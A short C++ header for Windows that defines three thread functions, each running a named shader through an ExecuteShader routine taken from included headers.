#pragma once
#include <windows.h>
#include "shaders.h"
#include "payloadexec.h"

DWORD WINAPI Shader1T() {
	ExecuteShader(Shader1, true);
	return 0;
}

DWORD WINAPI Shader2T() {
	ExecuteShader(Shader2, true);
	return 0;
}

DWORD WINAPI Shader3T() {
	ExecuteShader(Shader3, true);
	return 0;
}